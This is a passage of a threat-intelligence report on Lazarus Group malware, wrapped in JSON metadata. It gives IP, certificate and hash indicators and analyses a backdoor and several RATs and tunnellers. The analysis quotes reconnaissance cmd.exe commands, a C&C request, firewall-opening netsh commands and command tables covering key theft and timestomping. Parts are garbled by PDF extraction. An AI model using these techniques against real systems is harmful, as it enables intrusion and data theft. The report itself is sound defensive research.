24.201.106.142 173.198.127.221 41.33.212.94 86.120.134.50 31.192.208.227 77.241.47.234 193.19.174.60 182.73.40.130 220.132.243.188 58.64.203.66 69.196.83.206 81.93.72.18 62.210.146.3 61.122.232.25 208.124.153.14 209.254.82.137 140.112.90.235 118.22.154.159 47.176.2.12 207.162.24.86 164.70.22.40 178.252.148.240 211.240.78.135 212.14.44.245 202.56.120.210 210.213.80.237 184.163.74.15 180.234.11.19 210.241.42.173 51.254.71.167 218.248.46.26 41.41.241.194 31.3.225.57 69.91.178.16|12.49.13.202 31.210.105.105 202.129.24.4 210.213.90.173 187.109.80.61 212.219.35.51 203.131.230.104 2.32.113.178 187.44.139.252 123.200.9.178 82.144.131.5 202.183.185.91 209.105.239.42 209.81.121.51 140.115.31.220 80.78.73.204 140.115.42.147 212.14.44.245 165.123.67.111 66.207.112.187 203.66.57.237 140.116.178.123 140.116.31.195 140.112.14.16 202.183.185.90 41.72.101.138 59.120.19.101 125.214.195.17 69.196.83.206 175.45.61.44|31.192.208.xxx|\n\n\n-----\n\n###### 5.4 \u0007Certificates used  to redirect traffic\n\n**Certificate thumbprint**\n\nde8166daca44cca2ef26031f\nd8a489222d8fa74c\n\nb82ce23ef56fd59df2d54cd\n6ab0d097ec38a72bb\n\n1f2ae52ccf5ace9a27f521043\n816f8ca02405779\n\n6e55459ddbc666e5d6f898\n44f5d2a2647be426ca\n\nd35da9d13883b3f0c575144\nb3cee58d5744a9e48\n\n6bab9ca99fcdd465a56463a\n65122f9e7ba367219\n\na8b0b4f42547aaf608f062c\n6f9aa1e3fb33caaf0\n\nc84c214878ebbee35d853cb\n2f739f919238550a4\n\n935192f61d0a72cc24d01fea\nb5a18de9a3837b42\n\n26b4162e29de9c4a64b4dfd\n93b72c6426bc9dc8e\n\nf1f7c47c154a3f95cbc41a329\n9ce80a45e566519\n\n57cfdf9b1e3a3675e5a971e19\n05f1ca5afd228bf\n\n### 23 Lazarus arisen:\n\n\n-----\n\n###### 5.5 \u0007Malware\n\n**Hash**\n\n4cc10ab3f4ee6769e520694a10f611d5\n\n6dffcfa68433f886b2e88fd984b4995a\n1f2cd85583a4a56b764ba6429c2155ec\n\ncb52c013f7af0219d45953bae663c9a2\n9216b29114fb6713ef228370cbfe4045\n\n1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae\n\n85d316590edfb4212049c4490db08c4b\n1f7897b041a812f96f1925138ea38c46\n1507e7a741367745425e0530e23768e6\n\n9914075cc687bdc352ee136ac6579707\n\n9cc6854bc5e217104734043c89dc4ff8\n\n25200d3fe30785f3c90a91faf8ebf1b5\n5994a8fd8c68dd1cc51ce7ca0d9c2749\n889e320cf66520485e1a0475107d7419\n40e698f961eb796728a57ddf81f52b9a\n\n8e32fccd70cec634d13795bcb1da85ff\n\ne29fe3c181ac9ddbb242688b151f3310\n\n9216b29114fb6713ef228370cbfe4045\n\n570e6ea21cdce694a4a74876ca87534a\n\ne4fb05a8c2da92ec5b19bdb59814464a\n\nf38f6d976e6d66abc86f9992e808670a\n\n3c3982d068bc7f2d1e4742c2009b0f46\n\nb603a16a950056df336fe3950c81601d\nd032aeb54cf1229e011c070ecd64c33e\n\n5C1917F6753D03A08328132DB1E06571\n\n### 24 Lazarus arisen:\n\n\n-----\n\n#### 06 APPENDIX\n\n###### Recon module\n\nThe svchost.exe file (MD5 cb52c013f7af0219d45953bae663c9a2, size 128512\nbytes) is a Backdoor. This program is installed and launched on the target\nmachine through successful execution of exploits.\n\nOnce launched, the program adds itself to the auto-start by copying its file to the\ndirectory “%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\\nPrograms\\Startup”, collects information about the infected machine and sends it\nto the C&C server.\n\nIn addition, it can download and run third-party programs. The following\ncommands are executed using a command interpreter:\n\n\n«cmd.exe /c \\»hostname > %s\\»», &TempFileName);\n\n«cmd.exe /c \\»whoami >> %s\\»», &TempFileName);\n\n«cmd.exe /c \\»ver >> %s\\»», &TempFileName);\n\n«cmd.exe /c \\»ipconfig -all >> %s\\»», &TempFileName);\n\n«cmd.exe /c \\»ping www.google.com >> %s\\»», &TempFileName);\n\n«cmd.exe /c \\»query user >> %s\\»», &TempFileName);\n\n«cmd.exe /c \\»net user >> %s\\»», &TempFileName);\n\n«cmd.exe /c \\»net view >> %s\\»», &TempFileName);\n\n«cmd.exe /c \\»net view /domain >> %s\\»», &TempFileName);\n\n\n### 25 Lazarus arisen:\n\n\n-----\n\nexe /c \\»reg query \\»HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet\nSettings\\» >> %s\\»»,\n\n«cmd.exe /c \\»tasklist /svc >> %s\\»», &TempFileName);\n\n«cmd.exe /c \\»netstat -ano | find \\»TCP\\» >> %s\\»», &TempFileName);\n\n}\n\n\n###### The analyzed sample can download and run executable files on command from the C&C server (the \"http\" command). The \"killkill\" command, used for self-removal from the infected system, applies a hard-coded name of a .BAT file \"% temp% \\ tmp095j.bat\".\n\n**Command** **Description**\n\nkillkill Remove itself from the system\n\nhttp Download and run the file from the C&C server\n\n###### An example of a request to the C&C server is shown below:\n\nGET /design/dfbox/list.jsp?action=What&u=10729854751740 HTTP/1.1\n\nConnection: Keep-Alive\n\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101\nFirefox/47.0\n\nHost: www.eye-watch[.]in\n\n###### Below is a code block with a command request sent to the C&C server:\n\n### 26 Lazarus arisen:\n\n\n-----\n\n###### Below is a code block informing the C&C server about the results of file loading and execution commands:\n\n Below is a code block informing the C&C server about the results of self-removal commands:\n\n### 27 Lazarus arisen:\n\n\n-----\n\n###### Below is a code block informing the C&C server about results of the data system collection command:\n\n Client_RAT\n\n This remote control tool is installed on command from Recon, in the event the computer is of interest to the attacker. The application is deployed as follows: Dropper -> Loader -> Payload.\n\n The gpsvc.exe file (MD5: 1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae, size: 3449344 bytes) is an executable file and can be classified as Dropper. This file is downloaded on the target system using Recon.\n\n This console utility can be launched with the following arguments:\n\n\n**Arguments** **Description**\n\ngpsvc.exe -l Enumerates system services\n\ngpsvc.exe -e [path] Extracts and decrypts the payload and saves it to the\nspecified path\n\ngpsvc.exe –a [service name] Installs the library as a service\n\n[path to DLL]\n\n\n### 28 Lazarus arisen:\n\n\n-----\n\n###### The deskadp.dll and srservice.dll files (MD5: e29fe3c181ac9ddbb2426 88b151f3310, size: 79360 bytes) are executable dynamic libraries and can be classified as Loader. These files are downloaded on the target system using Recon and can ensure its persistence in the system using Dropper.\n\n Loader is used to decrypt Payload. The encrypted file named srservice.chm (MD5: 9216b29114fb6713ef228370cbfe4045) is a RAT, which is saved (in encrypted form) to the directory “%windir%\\Help\\X. chm”, where X is the name of the RAT file without an extension.\n\n An additional file named srservice.hlp (MD5: 8e32fccd70cec634d1379 5bcb1da85ff) is a RAT configuration file, which contains a C&C address embedded in an encrypted form.\n\n The decrypted configuration file contains the following network addresses:\n\n • tradeboard.mefound.com:443\n\n • movis-es.ignorelist.com:443\n\n In addition to configuration data, the file contains a built-in encrypted network address of the tradeboard.mefound.com:443 node.\n\n The strings are encrypted with a simple XOR operation of every subsequent 2 bytes with a constant 0x2CDF.\n\n### 29 Lazarus arisen:\n\n\n-----\n\n###### Below is the buffer with the result of strings’ decryption.\n\n### 30 Lazarus arisen:\n\n\n-----\n\n###### The application provides an option to specify the second network node, however it was not specified in the file identified and analyzed by Group-IB specialists.\n\n After its launch, srservice.dll scans the % windir%\\Help\\ directory for a file with the same name, but with the .chm extension, then decrypts and injects it into the address space of the lsass.exe process.\n\n Following this, the infected computer is controlled through a pre- installed infrastructure with several layers of anonymization designed to complicate investigation.\n\n The RAT contains usual commands in English. Communications with the C&C server are performed over an encrypted SSL channel as the Client_ RAT is compiled with statically linked libcurl libraries, version 7.47.1 (FEB 2016).\n\n This program may execute the following commands received from the C&C server:\n\n**Command** **Description**\n\nNONE Do not execute any commands\n\nGINF Collects and sends extensive system information about the PC\n\nSLEP Do not execute any commands\n\nHIBN Do not execute any commands\n\nDRIV Get information about available disks in the system\n\nDIRP List files with the specified extension\n\nCHDR Changes the current directory\n\nRUNX Get the user's token\n\nMOVE Renames the specified file\n\nFTIM Set the timestamps of the %windir%/system32/kernel32.dll file to the\nspecified file\n\nNEWF Create a new directory with the specified name\n\nZDWN Purportedly, downloads a file/files\n\nPEIN Inject the code in the specified process\n\nTCON Purportedly, it connects to the specified network node\n\nDIR Enumerates files in the selected directory\n\nDIE Remove itself from the system\n\nDEL Delete the selected file\n\nWIPE Delete the selected file and make it unrecoverable\n\n### 31 Lazarus arisen:\n\n\n-----\n\n###### Client_TrafficForwarder\n\nThis program is designed to provide access to the local network and is also\ninstalled using the original Dropper. The installation scheme is as follows:\nDropper -> Loader -> Loader -> Payload.\n\nThe gpsvc.exe and MBLCTR.EXE files (size: 753664 bytes, MD5: 85d316590edf\nb4212049c4490db08c4b) are executable files and can be classified as Loader.\nThis file is installed on the target system using Dropper, which is downloaded\nusing Recon or Client_RAT.\n\nThis console can be launched with the following arguments:\n\nArguments Description\n\ndropper.exe -x [key] -l Enumerates system services\n\ndropper.exe -x [key] -e Extracts and decrypts the payload from config and sets it as a service\n\n[servicename] [config]\n\ndropper.exe -x [key] -f Installs implants by adding information about them to the system\nregistry\n\ndropper.exe -x [key] -o Calls OpenEventA with a special event name\n\n[eventname]\n\ndropper.exe -x [key] -t Calls OpenEventA with a special event name, then calls Setvent API\n\n[eventname]\n\n  - Key means an encryption key. A MD5 hash (hashing algorithm) of this key is used to\ndecrypt the configuration file.\n\n  - Config means a path to the configuration file that contains the name of the service, its\ndescription, and the loader of the main module, which will be installed on the system as\na service.\n\n### 32 Lazarus arisen:\n\n\n-----\n\nThe program can also read executable data from the following registry keys\nand embed them into the selected process:\n\n\n\n- HKLM\\SYSTEM\\CurrentControlSet\\Services\\<name of service>\\\nSecurity\\Data2\n\n- HKLM\\SYSTEM\\CurrentControlSet\\Services\\<name of service>\\\nSecurity\\Data3\n\n\nfdsvc.exe (MD5 9914075cc687bdc352ee136ac6579707 and 60928 bytes) is an\nexecutable file and can be classified as loader.\n\nExample of the Loader launch:\n\nloader.exe -d \"encrypted_payload.bin\" -p 1540 -s\n\n[encrypted_C&C:port] -r [encrypted_commands]\n\n**Arguments** **Description**\n\n-d Name of the file for decryption\n\n-p ID of the process in which the payload should be embedded\n\n-r Encrypted param1\n\n-s Encrypted param2\n\nLoader is used to decrypt payload. The file named fdsvc.dll (MD5: 9cc6\n854bc5e217104734043c89dc4ff8, size: 480768 bytes) is an encrypted\npayload which is Client_TrafficForwarder.\n\nAfter decryption, it becomes a simple DLL (MD5 25200d3fe30785f3c9\n0a91faf8ebf1b5, size: 519392 bytes) and is used to create a tunnel from\nthe C&C server to the specified network resource. The payload provides\na secure connection over a specially created protocol via a proxy server\n(an infected current host).\n\n**Description**\n\nThe payload was compiled statically with the libcurl library, version\n7.49.1 (May 30, 2016), LibTomMath, and the libgcrypt library to support\nencrypted TLS traffic.\n\n### 33 Lazarus arisen:\n\n\n-----\n\nSome constants from the libgcrypt library are presented below:\n\nAfter decoding arguments (the arguments that were passed to the second\nstage module), the payload gets an IP address and a port of the C&C server.\nThe payload communicates with the C&C server using a specific encryption\nprotocol at the application level.\n\n### 34 Lazarus arisen:\n\n\n-----\n\nIf the remote host is specified, then the connection is performed to this node.\nAs has been mentioned, the sample body contains several Russian words in\ntransliteration:\n\n\"Nachalo\" is a debugging string that will be sent in encrypted format to the\nC&C server, indicating that a connection to the target node is established.\nWhen executing a thread, 5 attempts are made to connect to the C&C server\ndirectly. The program will shut down if the connection fails. In the event the\nconnection is successful, the application receives commands from the C&C\nserver and executes them. All commands and server responses are encrypted\nby default, but for your convenience, they are listed below in decrypted form.\n\nThe main purpose of connecting to the C&C server is to receive (or send)\nencrypted content from the server to the target machine. The connection\nto the C&C server is performed to the network address and port that are\nspecified as command-line arguments when the sample is launched (by\nLoader).\n\n### 35 Lazarus arisen:\n\n\n-----\n\nBelow is a list of available commands:\n\n**Commands from the C&C server** **Messages to the C&C server**\n\n**Command** **Description** **Command** **Description**\n\nustanavlivat to receive a network address Nachalo This message sent to the C&C\nof the active Server2 server server or the proxy during\nfrom the C&C server (the the start of the sample is the\naddress will be sent in the next start-up indicator\npackage)\n\nkliyent2podklyuchit a testing proxy performance\n\npoluchit to send a network address of package\nthe current Layer 2 server to\nthe C&C server ssylka to connect to the С&C server\n\nto forward traffic between the\n\npereslat to forward data between the C&C server and Server2\nC&C server and Server2\n\nvykhodit notifying the C&C server of\n\nderzhat to keep the connection open session termination\n\nvykhodit to terminate the session\n\nBy sending the \"ssylka\" message to the C&C server, the analyzed file can\nmake the C&C server keep the connection open for further traffic redirection\nbetween the C&C server and Layer 1. The \"ssylka\" command is executed\nin the event the \"pereslat\" command is received from the C&C server. This\nmeans that the C&C server initiates the communication session by sending the\n«pereslat» command and waits for the incoming connection from the program\n(with the \"ssylka\" message) to further forward traffic between the C&C server\nand Layer 1 (communications are possible in both directions). The sample\ndoes not have a list of commands to forward traffic between the C&C server\nand Server2, it just redirects data from the one socket to another, when two\nconnections are active.\n\nOne of the commands that can be received from the C&C server is\n«ustanavlivat». In the event the program receives it, it performs an additional\nrequest to the C&C server and receives a network address of the Server2\nnode, which will be further used as an end point to proxy network traffic.\n\nThe \"kliyent2podklyuchit\" message is intended to check the efficiency\nof an intermediate proxy server, through which network connections\nwill be performed. If the target computer is specified in the command\nline, the sample will connect to this host with an additional message\n\"kliyent2podklyuchit\". The connection is performed using the functionality of\nthe statically linked library “libcurl”. In the event the connection is successful,\ntraffic from the C&C server will further go through the proxy. If not, the\napplication terminates its operation.\n\n### 36 Lazarus arisen:\n\n\n-----\n\nThe C&C server also may send the \"poluchit\" command. Once this command\nis received, the analyzed file will send a network address of the current server\nServer2 to the C&C server.\n\nThe next possible command from the C&C server is \"pereslat\". Once this\ncommand is received, the file requests data from the C&C server and receives\na certain X number. Following this, the sample will execute a multi-threaded\nC&C request with the \"ssylka\" command and forward traffic between the\nC&C server and Server2 nodes, when necessary. The number of threads for\ntraffic redirection is equal to the X number that was previously obtained from\nthe C&C server. If X> 1, then more than one equivalent tunnel is established\nsimultaneously to redirect traffic from the C&C server to Server2 (the \"ssylka\"\ncommand).\n\n\"On top\" of the application protocol with encryption, application traffic is\nwrapped up inside ordinary TLS. \"Visible\" network traffic is a simple TLS\nconnection.\n\n\n16 xx xx xx xx yy 00 xx xx xx xx [32 rnd bytes] 00 00 1C C0 13 C0 14 C0 27 C0 2F\n00 9E 00 6B 00 67 00 39 00 33 00 9C 00 3D 00 3C 00 35 00 2F 01 00 xx xx 00\n0A 00 08 00 06 xx xx xx xx xx xx\n\n16 xx xx xx xx yy 00 xx xx xx xx [32 rnd bytes] 00 00 0E C0 13 C0 14 00 39 00 39\n00 33 00 35 00 2F 01 00\n\n16 xx xx xx xx yy 00 xx xx xx xx [32 rnd bytes] 00 00 xx 00 00 05 FF 01 00 01 00\n\n\n**Server_RAT**\n\nThe ejbss.dll library (MD5: 570e6ea21cdce694a4a74876ca87534a, size:\n226304 bytes) is classified as Server_RAT.\n\n**Description**\n\nThe file is a resident RAT application that, once launched, waits for\nincoming connections on a specific port to control the infected PC. The\nfunctions available for a remote operator include launching arbitrary\ncommands, collecting data about the system, active PC sessions and\nrunning processes, deleting arbitrary files, reading data from the file,\ndownloading and executing files.\n\nThe program is installed as a service (purportedly using Dropper) and\nextracts the payload from itself. The scheme is similar to that that is used\nto infect client (target) machines.\n\nThrough examination of infected proxies, Group-IB specialists identified a\nservice called rpcapt and a path to the program %WINDIR%\\ejbss.dll.\n\n### 37 Lazarus arisen:\n\n\n-----\n\nAfter startup, Payload is extracted and decrypted\n\n### 38 Lazarus arisen:\n\n\n-----\n\nThe decrypted file is also a dynamic library containing a payload.\nAfter decryption, the file looks for exported funtion with ordinal #1\nand calls it.\n\n- On first run the application checks for the \"mbcrs.rll\" file in the OS\nsystem directory. In the event the file exists, the app decrypts it and\nreads a port number from the file. This number will then be used\nfor network communications. If the file does not exist, it is created\nand the port number generated in random fashion is added there in\nencrypted form. It is worth noting that Group-IB specialists always\nobserved port 3365 on the proxy.\n\n- The file can use a port preconfigured by the attacker (and not a port\nwith a random number), if the \"mbcrs.rll\" file was copied with it during\nthe RAT installation.\n\n- For the network port that will be used for network communications,\nan rule is generated for the OS firewall. This action is performed by\nrunning one of the following commands:\n\n\nnetsh advfirewall firewall add rule name=CoreNetworkingHTTPS\ndir=in action=allow Protocol=TCP localport=%d\n\nnetsh firewall add portopening protocol=tcp port=%d\nname=CoreNetworkingHTTPS\n\nwhere %d – the above-mentioned port number\n\n\n\n- waits for incoming connections from the operator on the port,\nmentioned in the point above\n\n- can execute commands as required by the operator\n\n### 39 Lazarus arisen:\n\n\n-----\n\n### 40 Lazarus arisen:\n\n\n-----\n\n**•** **The table below contains a list of all commands available:**\n\n**Command** **Description**\n\nOF Collects and sends the following system data to the operator: OS version,\nprocessor, computer name, information about network interfaces, information\nabout mounted disks\n\nOG Enumerates and sends data about existing disks in the system\n\nOH Checks for certain files on the disk\n\nOR Changes the current working directory\n\nOI Enumerates and sends running processes\n\nOJ Terminates the process with a specific name\n\nOM Runs the command / file\n\nON Deletes a specific file\n\nOO Writes data to a specific file\n\nOP Sets the timestamps to a specific file that are the same as those of the system\nfile shell32.dll\n\nOQ Executes the command and send its output\n\nOU Create a file with specified content and set the file timestamp that is the same\nas the timestamp of shell32.dll\n\nOT Reads the file contents and sends it to the operator\n\nOS Searches for the specified file or directory, reads its contents and sends it to\nthe operator\n\nOV Gets and sends disk information\n\nOW Modifies the file’s timestamp\n\nOE Connect to a specific network node for traffic transmission\n\nOX Reads, decrypts, and sends data from a file of the form “%windir%\\system32\\\nhyrX.dll” in the system directory (where X is an arbitrary substring),\npurportedly containing the bot configuration\n\nOY Writes data to a file in the system directory\n\nOZ Gathers data about active sessions\n\nOС Sends the \"0d\" command to the operator\n\nOK Sends the \"0a\" command to the operator\n\n### 41 Lazarus arisen:\n\n\n-----\n\n**Server_TrafficForwarder**\n\nThe msvmgr.exe (MD5: 3c3982d068bc7f2d1e4742c2009b0f46, size:\n180224 bytes) and msdtc.exe (MD5: b603a16a950056df336fe3950c816\n01d, size: 348160 bytes, MD5: d032aeb54cf1229e011c070ecd64c33, size:\n315904 bytes) executable programs are Server_ TrafficForwarder.\n\nOn infected proxies, these programs always were child processes of\nServer_RAT and were located in %windows%.\n\nDescription\n\nThe file is a resident application that, once launched, waits for incoming\nconnections on a specific port to provide further control of the PC to the\nattacker.\n\nServer_TrafficForwarder uses the wolfSSL staticly linked library to\nimplement asymmetric encryption of traffic between the client and the\nserver.\n\n### 42 Lazarus arisen:\n\n\n-----\n\n**Keys**\n\nIt has two related files:\n\nThe “wcer.dat” file (size: 4382 bytes, md5: E39C8A1B2D35EC1B7BF73599\nEA4A33FA) is a certificate file:\n\nThe “wkey.dat” file (size: 1675 bytes, md5: F329B8A6957635C8CCA1C97\nFA459DC82) is a private key file\n\nThe related files are used to encrypt network traffic and verify the client.\n\n### 43 Lazarus arisen:\n\n\n-----\n\nInformation about the C&C server or addresses of clients is not available\nin the file. The sample just waits for incoming connections to the selected\nport.\n\n**Main functionality**\n\n- Parses the command line arguments\nExample: \"msvmgr.exe 4444 111.222.111.222 31337\"\n\n\nThe sample must be run with the following arguments:\n\nmsvmgr.exe port ip1 port2\n\nwhere port is a port used to wait for incoming connections\n\nip1 - an IP address of Layer 2 server to which it is required to connect\n\nport2 – a port of the Layer 2 server, to which it is required to connect to redirect\ntraffic\n\nBased on the above-mentioned information, in the event the second command\nline argument (IP address) is specified, then after establishing connection with the\nclient, the sample will connect to the network node from the second argument\n(for the above-mentioned example this will be \"111.222.111.222\") to the port from\nthe third argument (31337 in the example). This server will be used to proxy traffic\nfrom the client. If the command-line arguments are not specified, the remote\nclient will accept incoming connections, but will not tunnel the traffic, because it\nwill not be able to establish an outgoing connection with the next node (it is not\nspecified) and run two threads to redirect traffic.\n\n\n\n- After the start, it reads the contents of the key and certificate file\nfrom the current directory.\n\n- It binds the port from the arguments; if the arguments do not\ncontain a port — it listens on a random port and waits for incoming\nconnections\n\n**Supported functionality:**\n\n- performs network communications over an encrypted protocol\n\n- self-removal\n\n- reads and sends system information: about PC components, locales,\nfree space on disks, RAM size, network adapters and local interfaces,\nOS version, Windows version identifier, PC name\n\n### 44 Lazarus arisen:\n\n\n-----\n\n### 45 Lazarus arisen:\n\n\n-----\n\n- can read and send the contents of the private key file\n\n- checks the validity of client’s responses (checking if this is a legitimate\nclient). After first network request program gets the response from the\nclient, decrypts and compares it with a previously known response. In the\nevent he gets a different response - it drops the connection.\n\n**Below is the table of all available commands:**\n\n**Table 1**\n\n**Command** **Description**\n\n0x1095  \n0x1096 Collects and sends system information\n\n0x10AA Gets the configuration\n\n0x10AB Changes the configuration (including the port on which it listens for\nconnections)\n\n0x10AE  \n0x10AF  \n0x10B3 Reads a private key file and sends it to the operator\n\n0x10B4 Writes data to a file\n\n### 46 Lazarus arisen:\n\n\n-----\n\nGroup-IB specialists have detected several versions of the file. They differ in\nthe list of available commands. Another version of the malicious file has the\nfollowing command list:\n\n**Table 2**\n\n**Command** **Description**\n\nNONE  \nGINF Collects and sends system information about the PC\n\nGCFG Gets configuration\n\nSCFG Changes the configuration (including the port on which it listens connections)\n\nSLEP  \nHIBN  \nLCLR Records data to the file\n\nLDWN Reads a private key file and sends it to the operator\n\n**Backend_Listener**\n\nAn executable file “msdtc.exe” (MD5: 5C1917F6753D03A08328132DB1E06571,\nsize: 257 536 bytes) can be classified as Backend_Listener.\n\nIt is a service application waiting for incoming connections on two ports. It\ncan redirect traffic from one port to another, thereby implementing a tunnel\nbetween the client connected to the second port and the client connected to\nthe first one and vise versa.\n\n**Description**\n\nOnce launched, the application extracts two arguments from the command\nline. These are port numbers on which the application will wait for incoming\nconnections.\n\n### 47 Lazarus arisen:\n\n\n-----\n\nTo encrypt traffic, an open source library named wolfSSL is used. After the\napplication is started, the private key and certificate files will be extracted\nfrom the current directory. They are used to encrypt traffic between the\nserver and connected clients that must have identical key pairs. Without them,\nyou can not connect to the service, or decrypt its traffic.\n\nThe program opens two ports and waits for incoming connections from\nthe operator on one of them. The first port is port1 from the command-line\narguments. Port2 is the second argument. In our study, the first port was port\n8080, the second one was port 9090.\n\n### 48 Lazarus arisen:\n\n\n-----\n\nIn order to trigger traffic from one port to another, the operator performs\na connection to the server (server is the current sample, because it is just a\nservice waiting for incoming connections) on port2 (9090).\n\nOnly an operator can connect to the server to control traffic because the\nservice uses a private and public key pair to authorize and encrypt traffic (and\nthis key pair must be identical to the one that the client-operator will use). In\nthe event of absence of a key pair, or with a different pair of keys, the service\nwill drop connections.\n\nTo establish a successful connection, several checks will be performed. In\naddition, traffic is encrypted with a reversible algorithm.\n\nResponse data from the server is partially randomized. Probably, this\nis intended to randomize the length of outgoing packets, so that traffic\ngenerated by the server alters, which complicates its detection.\n\nIf all the legitimacy tests of the operator’s commands are passed, two traffic\nthreads from one port to another will be triggered.\n\n### 49 Lazarus arisen:\n\n\n-----\n\nFollowing this, when the client connects to the first port (8080), the service\nwill forward traffic from the first port to the second one and back.\n\nIf there are no active connections on the first port, the server issues the\n\"PELS\" command to the client connected to the second port.\n\nTo reverse-engineer the protocol of server communications with\nconnected clients, Group-IB specialists have developed a client that\nsuccessfully connects to both ports of the server. Its code was created\nbased on the server’s requests and responses as well as using the open\nsource library wolfSSL.\n\n### 50 Lazarus arisen:\n\n\n-----\n\nTo connect to the server in order to tunnel traffic, the operator should use\nAdmin_Tool designed to control the infrastructure:\n\n1. Admin_Tool must have a key pair identical to the server\n\n2. It sends a customized Hello-packet that differs from the one that is\nprovided by the library.\n\nBy default this packet (msg) is specified as follows in the library:\n\n\nThe correct Hello packet that will be accepted by Backend_Listener must be of the\nfollowing form:\n\n\nIn fact, this is an information packet, rather than a Hello packet, and its first\nbyte contains the length of the next packet sent («len»), while the rest bytes\nmust be zero in this case.\n\n3.  \u0007Admin_Tool sends an encrypted (special) packet with a length from the\nprevious packet (len).\n\n4. \u0007The server decrypts the contents of the packet sent and, after decryption,\nthe following conditions must be true:\n\n\n(DWORD)&decrypted_buff[5] == len\n\n(DWORD)&decrypted_buff[15] == len\n\nwhere len is the length of the packet\n\n\n5.  \u0007Admin_Tool sends DWORD with len2 < 201 where len2 is the length of the\nnext packet\n\n### 51 Lazarus arisen:\n\n\n-----\n\n6.  \u0007Admin_Tool sends the encrypted (special) second packet with the length\nreceived in the previous packet\n\n7.  \u0007The server decrypts the contents of the packet sent, and after decryption,\nthe following conditions must be true:\n\n\n(DWORD)&decrypted_buff[4] == 0xD1CC8594\n\n(DWORD)&decrypted_buff[8] == 3\n\n\n### 52 Lazarus arisen:\n\n\n-----\n\n## Preventing  and investigating cybercrime since 2003\n\nwww.group-ib.com info@group-ib.com twitter.com/groupib_gib\n\nblog.group-ib.com +7 495 984 33 64 linkedin.com/company/group-ib\n\nLazarus arisen:\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2017/2017.05.30.Lazarus_Arisen/Group-IB_Lazarus.pdf",
        "https://raw.githubusercontent.com/eric-erki/APT_CyberCriminal_Campagin_Collections/master/2017/2017.05.30.Lazarus_Arisen/Group-IB_Lazarus.pdf"
    ],
    "report_names": [
        "Group-IB_Lazarus",
        "Group-IB_Lazarus.pdf"
    ],
    "threat_actors": [
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "81dde5cc-c29f-430d-8c6e-e5e92d5015e7",
            "created_at": "2022-10-25T16:07:23.704358Z",
            "updated_at": "2025-03-27T02:02:09.932453Z",
            "deleted_at": null,
            "main_name": "Harvester",
            "aliases": [],
            "source_name": "ETDA:Harvester",
            "tools": [
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "Graphon",
                "Metasploit",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
